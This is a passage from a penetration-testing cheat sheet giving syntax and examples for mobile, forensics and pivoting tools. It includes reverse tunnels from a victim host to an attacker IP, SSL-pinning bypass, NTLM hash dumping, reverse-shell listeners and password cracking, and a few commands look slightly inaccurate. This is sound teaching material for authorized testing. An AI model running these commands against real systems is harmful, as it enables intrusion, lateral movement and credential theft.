sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt

# PMKID attack only
sudo wifite --pmkid

# Target specific BSSID
sudo wifite --bssid AA:BB:CC:DD:EE:FF
```

---

## 8. Mobile Testing (Tools 81–85)

> Android and iOS application security testing tools.

---

### Tool 81 — ADB (Android Debug Bridge)

**Description:** Command-line tool for communicating with Android devices/emulators for file transfer, shell access, app install, and logcat.

📦 **Install:** `sudo apt install adb`

🔧 **Syntax:** `adb [options] <command>`

🏷️ **Key Commands:**

| Command | Description |
|---------|-------------|
| `adb devices` | List connected devices |
| `adb shell` | Open device shell |
| `adb pull/push` | Transfer files |
| `adb logcat` | View device logs |
| `adb install` | Install APK |

💡 **Example:**
```bash
# Connect and shell
adb devices
adb shell

# Pull APK from device
adb shell pm path com.example.app
adb pull /data/app/com.example.app.apk ./app.apk

# Forward port (Burp proxy)
adb reverse tcp:8080 tcp:8080

# Run activity
adb shell am start -n com.example.app/.MainActivity
```

---

### Tool 82 — apktool

**Description:** Tool for reverse engineering Android APK files — decoding resources, smali code, and repackaging modified apps.

📦 **Install:** `sudo apt install apktool`

🔧 **Syntax:** `apktool d <apk> -o <dir>` / `apktool b <dir> -o <new.apk>`

🏷️ **Key Commands:**

| Command | Description |
|---------|-------------|
| `d` | Decode/decompile APK |
| `b` | Build APK from source |
| `if` | Install framework files |
| `-f` | Force overwrite |
| `-r` | Do not decode resources |

💡 **Example:**
```bash
# Decompile APK
apktool d app.apk -o decompiled/

# Inspect smali code and AndroidManifest.xml
cat decompiled/AndroidManifest.xml
ls decompiled/smali/

# Modify and rebuild
apktool b decompiled/ -o modified_app.apk

# Sign rebuilt APK
jarsigner -keystore keystore.jks modified_app.apk alias
```

---

### Tool 83 — jadx

**Description:** Dex to Java decompiler for producing readable Java source code from Android DEX and APK files.

📦 **Install:** `sudo apt install jadx`

🔧 **Syntax:** `jadx [options] <input.apk/dex>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-d` | Output directory |
| `-r` | No resource decoding |
| `--deobf` | Enable deobfuscation |
| `--show-bad-code` | Show problematic code sections |
| `-j` | Threads count |

💡 **Example:**
```bash
# Decompile to Java source
jadx app.apk -d jadx_out/

# Launch GUI
jadx-gui app.apk

# Search for hardcoded secrets
grep -r "password\|api_key\|secret\|token" jadx_out/ -i
grep -r "http://\|https://" jadx_out/ | grep -v "android"
```

---

### Tool 84 — Frida

**Description:** Dynamic instrumentation toolkit for injecting JavaScript snippets into native apps on Android/iOS for runtime analysis and bypass.

📦 **Install:** `pip install frida-tools`

🔧 **Syntax:** `frida -U -f <package> -l <script.js>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-U` | Use USB device |
| `-f` | Spawn app by package name |
| `-l` | Load JavaScript script |
| `-p` | Attach to PID |
| `--no-pause` | Don't pause on spawn |

💡 **Example:**
```bash
# Bypass SSL pinning with common script
frida -U -f com.example.app -l ssl_bypass.js --no-pause

# List running processes
frida-ps -U

# Trace function calls
frida-trace -U -f com.example.app -i "SSL_*"

# Use community SSL bypass
frida -U -f com.example.app --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida
```

---

### Tool 85 — objection

**Description:** Runtime mobile exploration toolkit built on Frida for patching apps, bypassing SSL pinning, exploring filesystem, and dumping memory.

📦 **Install:** `pip install objection`

🔧 **Syntax:** `objection -g <package> explore`

🏷️ **Key Commands (in shell):**

| Command | Description |
|---------|-------------|
| `android sslpinning disable` | Bypass SSL pinning |
| `android root disable` | Bypass root detection |
| `android hooking list classes` | List loaded classes |
| `android hooking watch method` | Hook a specific method |
| `file download/upload` | Transfer files |

💡 **Example:**
```bash
# Launch objection against app
objection -g com.example.app explore

# In objection shell:
# android sslpinning disable
# android root disable
# android hooking list activities
# android hooking generate simple com.example.app.LoginActivity
```

---

## 9. Forensics & DFIR (Tools 86–95)

> Digital Forensics and Incident Response tools for evidence collection and analysis.

---

### Tool 86 — Volatility 3

**Description:** Advanced memory forensics framework for analyzing RAM dumps: process trees, network connections, artifacts, and malware detection.

📦 **Install:** `sudo apt install volatility3` or `pip install volatility3`

🔧 **Syntax:** `vol -f <memory.img> <plugin>`

🏷️ **Key Plugins:**

| Plugin | Description |
|--------|-------------|
| `windows.pslist` | List running processes |
| `windows.netscan` | Network connections |
| `windows.cmdline` | Process command lines |
| `windows.malfind` | Detect injected code |
| `windows.hashdump` | Dump NTLM hashes from memory |

💡 **Example:**
```bash
# List processes
vol -f memory.img windows.pslist

# Detect malware injection
vol -f memory.img windows.malfind --dump

# Network connections
vol -f memory.img windows.netscan

# Dump NTLM hashes
vol -f memory.img windows.hashdump

# Command line arguments
vol -f memory.img windows.cmdline
```

---

### Tool 87 — Autopsy

**Description:** Open-source digital forensics platform for hard drive and mobile device analysis with timeline, keyword search, and reporting.

📦 **Install:** `sudo apt install autopsy`

🔧 **Syntax:** Launch GUI with `autopsy` or via web interface at `http://localhost:9999/autopsy`

🏷️ **Key Features:**

| Feature | Description |
|---------|-------------|
| File Analysis | Browse filesystem artifacts |
| Keyword Search | Search across all evidence |
| Timeline | Chronological event view |
| Hash Lookup | Check against known hash sets |
| Email Analysis | Parse email artifacts |

💡 **Example:**
```bash
# Start Autopsy
autopsy &
# Create case, Add data source (disk image / folder)
# Run ingest modules (hash lookup, keyword search, email, etc.)
# Review results in web interface at http://localhost:9999/autopsy
```

---

### Tool 88 — bulk_extractor

**Description:** Carves email addresses, URLs, credit cards, phone numbers, and other artifacts from disk images or raw files without mounting.

📦 **Install:** `sudo apt install bulk-extractor`

🔧 **Syntax:** `bulk_extractor -o <output_dir> <image>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-o` | Output directory |
| `-E` | Enable specific scanner |
| `-S` | Set scanner option |
| `-x` | Disable scanner |
| `-j` | Threads |

💡 **Example:**
```bash
# Full extraction from disk image
bulk_extractor -o be_output/ disk.img

# View results
ls be_output/
cat be_output/email.txt
cat be_output/url.txt
cat be_output/domain.txt
```

---

### Tool 89 — strings / FLOSS

**Description:** `strings` extracts ASCII/Unicode strings from binaries; FLOSS (FireEye) adds deobfuscation of stacked/decoded strings in malware.

📦 **Install:** `strings` pre-installed. FLOSS: `pip install flare-floss`

🔧 **Syntax:** `strings <binary>` / `floss <binary>`

💡 **Example:**
```bash
# Basic string extraction (min 8 chars)
strings -n 8 malware.exe | grep -i "http\|pass\|key\|cmd"

# Unicode strings
strings -e l malware.exe   # 16-bit little-endian

# FLOSS with deobfuscation
floss malware.exe --no-static-strings -o floss_output.txt

# Pipe to file
strings malware.exe > strings_out.txt
```

---

### Tool 90 — YARA

**Description:** Pattern-matching tool for malware identification and classification using rule-based signatures (strings, hex, regex, conditions).

📦 **Install:** `sudo apt install yara` or `pip install yara-python`

🔧 **Syntax:** `yara [options] <rules.yar> <target>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-r` | Recursive directory scan |
| `-s` | Print matched strings |
| `-m` | Print metadata |
| `-n` | Negate (non-matching files) |

💡 **Example:**
```bash
# Scan file with rules
yara rules/malware.yar suspicious_file.exe

# Recursive scan
yara -r rules/ /path/to/scan/

# Example YARA rule
cat > detect_shell.yar << 'EOF'
rule Reverse_Shell {
    meta:
        author = "Analyst"
    strings:
        $s1 = "/bin/bash" ascii
        $s2 = "socket" ascii
    condition:
        all of them
}
EOF
yara detect_shell.yar /tmp/
```

---

### Tool 91 — binwalk

**Description:** Firmware analysis tool that scans binary files for embedded files, filesystems, executables, compression, and encryption signatures.

📦 **Install:** `sudo apt install binwalk`

🔧 **Syntax:** `binwalk [options] <file>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-e` | Extract known file types |
| `-M` | Recursive extraction |
| `-A` | Scan for executable code |
| `-B` | Scan for boot loader signatures |
| `--entropy` | Calculate file entropy |

💡 **Example:**
```bash
# Scan firmware
binwalk firmware.bin

# Extract embedded files
binwalk -e firmware.bin

# Recursive extraction
binwalk -Me firmware.bin

# Entropy analysis
binwalk --entropy firmware.bin
```

---

### Tool 92 — foremost

**Description:** File carving tool that recovers files based on headers, footers, and internal data structures from disk images or raw data.

📦 **Install:** `sudo apt install foremost`

🔧 **Syntax:** `foremost -i <image> -o <output_dir>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-i` | Input file/image |
| `-o` | Output directory |
| `-t` | File types (pdf,jpg,mp4,all) |
| `-v` | Verbose |
| `-c` | Config file |

💡 **Example:**
```bash
# Recover all known file types
foremost -i disk.img -o carved_files/ -v

# Recover only images and PDFs
foremost -i disk.img -o carved_files/ -t jpg,png,pdf

# Recover from memory dump
foremost -i memory.img -o memory_carve/ -t all
```

---

### Tool 93 — ExifTool

**Description:** Metadata reader/writer for images, audio, video, and documents; extracts GPS, camera info, timestamps, and author data.

📦 **Install:** `sudo apt install libimage-exiftool-perl`

🔧 **Syntax:** `exiftool [options] <file>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-all` | All metadata |
| `-GPS*` | GPS fields only |
| `-r` | Recursive |
| `-csv` | CSV output |
| `-tagsfromfile` | Copy tags between files |

💡 **Example:**
```bash
# View all metadata
exiftool photo.jpg

# Extract GPS coordinates
exiftool -GPS:GPSLatitude -GPS:GPSLongitude photo.jpg

# Remove all metadata (sanitize)
exiftool -all= -overwrite_original photo.jpg

# Recursive scan for metadata
exiftool -r -csv *.jpg > metadata.csv
```

---

### Tool 94 — log2timeline / Plaso

**Description:** Digital forensics timeline creation tool that parses logs, artifacts, and filesystem metadata into a single super-timeline.

📦 **Install:** `sudo apt install plaso`

🔧 **Workflow:**
```bash
# Extract artifacts to storage file
log2timeline.py --storage-file timeline.plaso /path/to/evidence/

# Filter and output timeline
psort.py -o dynamic -w timeline.csv timeline.plaso
```

🏷️ **Key Tools:**

| Tool | Description |
|------|-------------|
| `log2timeline.py` | Main timeline extractor |
| `psort.py` | Sort/filter/export timelines |
| `pinfo.py` | Show storage file info |

💡 **Example:**
```bash
# Parse Windows image
log2timeline.py --storage-file windows.plaso windows_image.E01

# Filter to specific timeframe
psort.py -o dynamic windows.plaso "date > '2024-01-01' AND date < '2024-12-31'" -w 2024_timeline.csv
```

---

### Tool 95 — Velociraptor

**Description:** Advanced open-source DFIR and endpoint monitoring platform for artifact collection, hunting, and live response at scale.

📦 **Install:** Download from `https://github.com/Velocidex/velociraptor/releases`

🔧 **Quick Setup:**
```bash
# Self-contained GUI (testing)
./velociraptor gui

# Generate config
./velociraptor config generate -i

# Start production server
./velociraptor --config server.config.yaml frontend -v
```

🏷️ **Key Features:**

| Feature | Description |
|---------|-------------|
| VQL | Velociraptor Query Language |
| Artifacts | Pre-built collection modules |
| Hunts | Mass endpoint collection campaigns |
| Live Response | Real-time endpoint interaction |

---

## 10. Misc / Utility (Tools 96–100)

> Tunneling, pivoting, shell stability, and utility tools for real-world engagements.

---

### Tool 96 — proxychains

**Description:** Routes TCP connections through SOCKS4/5 or HTTP proxies; essential for tunneling tools through pivots and Tor.

📦 **Install:** `sudo apt install proxychains4`

🔧 **Syntax:** `proxychains4 [options] <command>`

🏷️ **Config:** Edit `/etc/proxychains4.conf`

```ini
# Example config
dynamic_chain
proxy_dns
[ProxyList]
socks5  127.0.0.1  1080
socks4  127.0.0.1  9050
```

💡 **Example:**
```bash
# Route nmap through SOCKS5 pivot
proxychains4 nmap -sT -Pn 10.10.10.5 -p 80,443,445

# Route browser through Tor
proxychains4 firefox

# With chisel SOCKS5 tunnel
proxychains4 evil-winrm -i 10.10.10.5 -u admin -p pass
```

---

### Tool 97 — chisel

**Description:** Fast TCP/UDP tunneling tool over HTTP with SSH encryption; creates reverse SOCKS proxies and port forwards for pivoting.

📦 **Install:** Download from `https://github.com/jpillora/chisel/releases`

🔧 **Workflow:**

```bash
# Attacker (server mode)
./chisel server -p 8080 --reverse

# Victim (client mode) - creates reverse SOCKS5 on 1080
./chisel client 10.10.14.5:8080 R:socks

# Port forward (victim:3389 to attacker:3389)
./chisel client 10.10.14.5:8080 R:3389:127.0.0.1:3389
```

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `server` | Start server mode |
| `client` | Start client mode |
| `--reverse` | Allow reverse tunnels |
| `-p` | Port |
| `R:socks` | Reverse SOCKS proxy |

---

### Tool 98 — ligolo-ng

**Description:** Modern tunneling/pivoting tool using TUN interfaces for seamless network access through compromised hosts without proxychains.

📦 **Install:** Download from `https://github.com/nicocha30/ligolo-ng/releases`

🔧 **Workflow:**
```bash
# Attacker - setup TUN interface and start proxy
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Target - run agent
./agent -connect 10.10.14.5:11601 -ignore-cert

# In ligolo console:
# session      <- Select agent
# ifconfig     <- View interfaces
# start        <- Start tunnel

# Add route on attacker
sudo ip route add 192.168.100.0/24 dev ligolo
```

---

### Tool 99 — pwncat-cs

**Description:** Post-exploitation platform and reverse shell handler with automatic stabilization, file transfer, persistence, and plugin system.

📦 **Install:** `pip install pwncat-cs`

🔧 **Syntax:** `pwncat-cs -l -p <port>` (listen) or `pwncat-cs <host>:<port>` (connect)

🏷️ **Key Commands (in shell):**

| Command | Description |
|---------|-------------|
| Ctrl+D | Toggle between local/remote |
| `upload/download` | Transfer files |
| `run` | Execute module |
| `implant` | Add persistence |
| `enumerate` | Run enumeration modules |

💡 **Example:**
```bash
# Start listener
pwncat-cs -l -p 4444

# When shell connects - automatic PTY upgrade occurs
# Local mode commands:
# upload /tools/linpeas.sh /tmp/linpeas.sh
# run enumerate.system.network
```

---

### Tool 100 — rlwrap

**Description:** Readline wrapper that adds command history, arrow key navigation, and tab completion to any command-line program (great for netcat shells).

📦 **Install:** `sudo apt install rlwrap`

🔧 **Syntax:** `rlwrap <command>`

💡 **Example:**
```bash
# Stable netcat listener with history
rlwrap nc -lvnp 4444

# Add readline to any interactive shell
rlwrap ncat -lvnp 9999

# History file
rlwrap -H ~/.my_pentest_history nc -lvnp 4444
```

---

## Quick Reference Table — All 100 Tools

| # | Tool | Category | Primary Use |
|---|------|----------|-------------|
| 1 | nmap | Recon & OSINT | Network/port scanning, service detection |
| 2 | masscan | Recon & OSINT | High-speed TCP port scanning |
| 3 | rustscan | Recon & OSINT | Ultra-fast port scan + nmap handoff |
| 4 | theHarvester | Recon & OSINT | Email/subdomain/employee OSINT |
| 5 | subfinder | Recon & OSINT | Passive subdomain enumeration |
| 6 | amass | Recon & OSINT | Deep attack surface mapping |
| 7 | gobuster (dns) | Recon & OSINT | DNS subdomain brute force |
| 8 | dnsx | Recon & OSINT | Bulk DNS resolution and queries |
| 9 | httpx | Recon & OSINT | Web server probing and fingerprinting |
| 10 | shodan-cli | Recon & OSINT | Internet device search engine CLI |
| 11 | whois | Recon & OSINT | Domain registration info lookup |
| 12 | dig | Recon & OSINT | DNS record lookup and zone transfers |
| 13 | host | Recon & OSINT | Simple DNS forward/reverse resolution |
| 14 | nslookup | Recon & OSINT | Interactive DNS queries |
| 15 | dnsrecon | Recon & OSINT | Comprehensive DNS enumeration |
| 16 | Burp Suite | Web App Testing | HTTP proxy, scanner, intruder platform |
| 17 | nikto | Web App Testing | Web server vulnerability scanning |
| 18 | dirsearch | Web App Testing | Web path/directory brute force |
| 19 | ffuf | Web App Testing | Fast web fuzzing (dir/vhost/param) |
| 20 | gobuster (dir) | Web App Testing | Directory and file brute force |
| 21 | wfuzz | Web App Testing | Flexible web application fuzzer |
| 22 | sqlmap | Web App Testing | Automated SQL injection exploitation |
| 23 | XSStrike | Web App Testing | Advanced XSS detection and exploitation |
| 24 | dalfox | Web App Testing | Fast XSS scanner with blind XSS support |
| 25 | wafw00f | Web App Testing | WAF detection and fingerprinting |
| 26 | whatweb | Web App Testing | Web technology fingerprinting |
| 27 | wapiti | Web App Testing | Black-box web vulnerability scanner |
| 28 | nuclei | Web App Testing | Template-based vulnerability scanning |
| 29 | arjun | Web App Testing | HTTP parameter discovery |
| 30 | jwt_tool | Web App Testing | JWT testing, tampering, and cracking |
| 31 | nmap NSE | Network Pentesting | Script-based service enumeration and vulns |
| 32 | netcat | Network Pentesting | TCP/UDP connections, shells, file transfer |
| 33 | socat | Network Pentesting | Advanced relay, stable shells, port forward |
| 34 | tcpdump | Network Pentesting | CLI packet capture and analysis |
| 35 | tshark/Wireshark | Network Pentesting | Packet analysis and protocol dissection |
| 36 | Responder | Network Pentesting | LLMNR/NBT-NS poisoning, NTLM hash capture |
| 37 | Impacket | Network Pentesting | Windows protocol attacks (SMB/Kerberos) |
| 38 | nbtscan | Network Pentesting | NetBIOS name scanning |
| 39 | enum4linux-ng | Network Pentesting | SMB/LDAP enumeration |
| 40 | smbclient | Network Pentesting | SMB share access and file transfer |
| 41 | arp-scan | Network Pentesting | Local network host discovery via ARP |
| 42 | hping3 | Network Pentesting | Custom packet crafting and firewall testing |
| 43 | scapy | Network Pentesting | Python packet manipulation library |
| 44 | netdiscover | Network Pentesting | ARP-based host discovery |
| 45 | CrackMapExec/nxc | Network Pentesting | Network-wide SMB/LDAP auth and enumeration |
| 46 | hashcat | Password Attacks | GPU-accelerated hash cracking |
| 47 | John the Ripper | Password Attacks | Multi-format offline password cracking |
| 48 | hydra | Password Attacks | Network service login brute forcing |
| 49 | medusa | Password Attacks | Parallel network login brute forcing |
| 50 | crowbar | Password Attacks | RDP/VNC/SSH key brute forcing |
| 51 | CeWL | Password Attacks | Website-based custom wordlist generation |
| 52 | crunch | Password Attacks | Custom wordlist generation by pattern |
| 53 | cupp | Password Attacks | Targeted personal profile wordlist generation |
| 54 | rockyou.txt | Password Attacks | Primary password dictionary reference |
| 55 | kwprocessor | Password Attacks | Keyboard walk wordlist generation |
| 56 | Metasploit (msfconsole) | Exploitation | Exploit framework with 2000+ modules |
| 57 | msfvenom | Exploitation | Payload and shellcode generation |
| 58 | searchsploit | Exploitation | Offline exploit database search |
| 59 | Exploit-DB | Exploitation | Online exploit archive and PoC lookup |
| 60 | BeEF | Exploitation | Browser-based XSS exploitation framework |
| 61 | sqlninja | Exploitation | MSSQL SQL injection exploitation |
| 62 | RouterSploit | Exploitation | Embedded device exploitation framework |
| 63 | Armitage | Exploitation | GUI front-end for Metasploit |
| 64 | Cobalt Strike | Exploitation | Commercial adversary simulation C2 |
| 65 | SILENTTRINITY/Covenant | Exploitation | .NET-based modern C2 frameworks |
| 66 | BloodHound | Active Directory | AD attack path graph visualization |
| 67 | SharpHound | Active Directory | BloodHound AD data collection |
| 68 | Mimikatz | Active Directory | Windows credential extraction |
| 69 | Rubeus | Active Directory | Kerberos attacks (Kerberoast/AS-REP) |
| 70 | Kerbrute | Active Directory | Kerberos username enum and password spray |
| 71 | CrackMapExec/nxc | Active Directory | AD-wide SMB/LDAP attack Swiss knife |
| 72 | Evil-WinRM | Active Directory | WinRM remote shell with PTH support |
| 73 | PowerView | Active Directory | PowerShell AD enumeration |
| 74 | ADACLScanner | Active Directory | AD ACL permission auditing |
| 75 | ldapdomaindump | Active Directory | LDAP-based AD object information dump |
| 76 | Aircrack-ng Suite | Wireless | WEP/WPA packet capture and cracking |
| 77 | hashcat (PMKID) | Wireless | WPA2 PMKID offline hash cracking |
| 78 | hcxdumptool | Wireless | PMKID and handshake capture |
| 79 | hcxtools | Wireless | Wi-Fi capture format conversion |
| 80 | Wifite | Wireless | Automated end-to-end Wi-Fi attack tool |
| 81 | adb | Mobile | Android device control and file access |
| 82 | apktool | Mobile | APK decompile, modify, and rebuild |
| 83 | jadx | Mobile | DEX to Java source code decompiler |
| 84 | frida | Mobile | Dynamic runtime app instrumentation |
| 85 | objection | Mobile | Runtime mobile app exploration via Frida |
| 86 | volatility3 | Forensics & DFIR | Memory forensics and analysis framework |
| 87 | autopsy | Forensics & DFIR | Digital forensics investigation GUI platform |
| 88 | bulk_extractor | Forensics & DFIR | Artifact carving from disk images |
| 89 | strings/FLOSS | Forensics & DFIR | String extraction from binary files |
| 90 | YARA | Forensics & DFIR | Malware pattern matching and detection |
| 91 | binwalk | Forensics & DFIR | Firmware analysis and file extraction |
| 92 | foremost | Forensics & DFIR | File carving from raw disk images |
| 93 | exiftool | Forensics & DFIR | File metadata extraction and editing |
| 94 | log2timeline/plaso | Forensics & DFIR | Digital forensics super-timeline creation |
| 95 | velociraptor | Forensics & DFIR | Live endpoint DFIR platform and hunting |
| 96 | proxychains | Misc/Utility | Route tool traffic through SOCKS/HTTP proxy |
| 97 | chisel | Misc/Utility | HTTP tunneling and reverse SOCKS proxy |
| 98 | ligolo-ng | Misc/Utility | TUN-based seamless network pivoting |
| 99 | pwncat-cs | Misc/Utility | Advanced reverse shell handler and platform |
| 100 | rlwrap | Misc/Utility | Shell stabilization with readline support |

---

## Common Pentest Workflow Integration

```
[Reconnaissance]
    nmap, subfinder, amass, theHarvester, shodan-cli
        |
        v
[Service Enumeration]
    nmap NSE, enum4linux-ng, smbclient, httpx, dnsx
        |
        v
[Vulnerability Discovery]
    nuclei, nikto, searchsploit, ffuf, wafw00f
        |
        v
[Exploitation]
    Metasploit, sqlmap, Impacket, BeEF
        |
        v
[Post-Exploitation / AD]
    mimikatz, BloodHound, Rubeus, PowerView
        |
        v
[Pivoting & Lateral Movement]
    chisel, ligolo-ng, proxychains, evil-winrm
        |
        v
[Exfiltration & Persistence]
    pwncat-cs, msfvenom payloads, CrackMapExec
        |
        v
[Reporting]
    Document findings with evidence and remediation
```

---

## Essential One-Liners Reference

```bash
# Fast full recon pipeline
subfinder -d target.com -silent | httpx -silent -title -status-code | tee live_hosts.txt
cat live_hosts.txt | nuclei -t cves/ -o nuclei_findings.txt

# Extract all captured NTLMv2 hashes from Responder logs
cat /usr/share/responder/logs/*.txt | grep "NTLMv2"

# Crack all hashes (auto-detect format with John)
john --list=formats | head -30   # view formats
john --format=auto hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# AD initial null session check
nxc smb 10.10.10.0/24 -u '' -p '' --shares 2>/dev/null | grep -i "READ\|WRITE"

# OSINT pipeline
theHarvester -d target.com -b all -f harvest && \
  amass enum -passive -d target.com -o amass.txt && \
  cat amass.txt | httpx -silent -title -tech-detect

# Port scan to service enumeration pipeline
nmap -sV -sC -p$(rustscan -a 10.10.10.5 --ulimit 5000 -q | tr '\n' ',') 10.10.10.5 -oN full_scan.txt
```

---

## Wordlist Locations on Kali

| Wordlist | Path |
|---------|------|
| rockyou.txt | `/usr/share/wordlists/rockyou.txt.gz` |
| SecLists (all) | `/usr/share/seclists/` |
| Dirb common | `/usr/share/wordlists/dirb/common.txt` |
| DNS subdomains | `/usr/share/seclists/Discovery/DNS/` |
| Web content | `/usr/share/seclists/Discovery/Web-Content/` |
| Passwords | `/usr/share/seclists/Passwords/` |
| Usernames | `/usr/share/seclists/Usernames/` |
| FUZZ payloads | `/usr/share/seclists/Fuzzing/` |
| Burp params | `/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt` |

---

## Hash Type Reference (hashcat -m values)

| Hash Type | Mode (-m) |
|-----------|-----------|
| MD5 | 0 |
| SHA1 | 100 |
| SHA256 | 1400 |
| NTLM | 1000 |
| NTLMv1 | 3000 |
| NTLMv2 | 5600 |
| NetNTLMv2 | 5600 |
| Kerberos TGS (Kerberoast) | 13100 |
| Kerberos AS-REP (AS-REP Roast) | 18200 |
| WPA2-PSK (PMKID/EAPOL) | 22000 |
| bcrypt | 3200 |
| MD5crypt (Linux) | 500 |
| SHA512crypt (Linux) | 1800 |

---

*End of Top 100 Security Tools Cheat Sheet — Volume 12*

> **Remember:** With great power comes great responsibility. Always obtain written authorization before testing. Document everything. Stay ethical. Stay legal.
